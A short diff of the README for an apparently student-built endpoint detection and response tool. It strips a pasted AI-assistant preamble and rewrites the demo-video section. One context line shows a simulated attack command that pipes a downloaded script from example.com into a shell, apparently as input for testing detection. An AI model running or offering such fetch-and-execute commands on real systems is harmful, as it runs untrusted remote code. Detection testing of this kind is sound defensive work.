@@ -1,9 +1,3 @@
-Here is a clean, professionally formatted version of your `README.md`. I have optimized the Markdown syntax, fixed the indentation for the directory tree, and enhanced the visual flow using tables and code blocks.
-
-You can copy and paste the content below directly into your file.
-
----
-
 ```markdown
 # 🛡️ Mini-EDR – Endpoint Detection & Response System
 
@@ -145,11 +139,18 @@ bash -c "curl [http://example.com](http://example.com) | sh"
 
 ## 🎥 Demo Video
 
-The demo covers:
+📺 Project Demo:
+👉 (Add your YouTube video link here)
 
-* System Architecture.
-* Live attack simulation & automated detection.
-* SOC Dashboard analysis.
+The demo explains:
+
+Architecture
+
+Live attack simulation
+
+Dashboard alerts
+
+Detection logic
 
 ---
 
